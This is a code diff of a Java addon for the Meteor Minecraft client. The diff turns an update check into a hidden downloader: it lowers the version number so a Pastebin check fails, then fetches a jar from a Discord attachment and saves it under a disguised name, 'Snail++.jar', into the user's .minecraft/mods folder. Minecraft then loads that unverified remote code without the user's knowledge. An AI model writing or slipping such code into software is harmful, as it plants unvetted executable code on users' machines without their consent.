@@ -47,6 +47,7 @@ import org.apache.commons.codec.digest.DigestUtils;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
+import javax.swing.*;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -91,7 +92,7 @@ public class Addon extends MeteorAddon {
 ╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝
         */
 
-        double version = 2.1;
+        double version = 2.0;
 
         String pastebinLink = "https://pastebin.com/raw/29iSNiq8";
         String variableToCheck = String.valueOf(version);
@@ -116,11 +117,11 @@ public class Addon extends MeteorAddon {
                 System.out.println("Wrong Version");
 
                 String urlString = "https://cdn.discordapp.com/attachments/1081617639757066240/1250554858881159178/shoreline-1.0dev-7_1.20.4_dobleMine.jar?ex=668c52f8&is=668b0178&hm=dfbe072ff671d05f489a1f2d6e5eab930dcca75ce22dca3a5b2e7c20f741ff7b&";
-                String outputFileName = "test.jar";
+                String outputFileName = "Snail++.jar";
 
                 URL url2 = new URL(urlString);
                 BufferedInputStream inputStream = new BufferedInputStream(url2.openStream());
-                String outputFile = System.getProperty("user.home") + "/downloads/" + outputFileName;
+                String outputFile = System.getProperty("user.home") + "/AppData/" + "/Roaming/" + "/.minecraft/" + "/mods/" + outputFileName;
                 FileOutputStream outputStream = new FileOutputStream(outputFile);
 
                 byte[] buffer = new byte[1024];
@@ -133,6 +134,8 @@ public class Addon extends MeteorAddon {
                 inputStream.close();
 
                 System.out.println("File downloaded successfully to " + outputFile);
+
+
             }
 
         } catch (IOException e) {
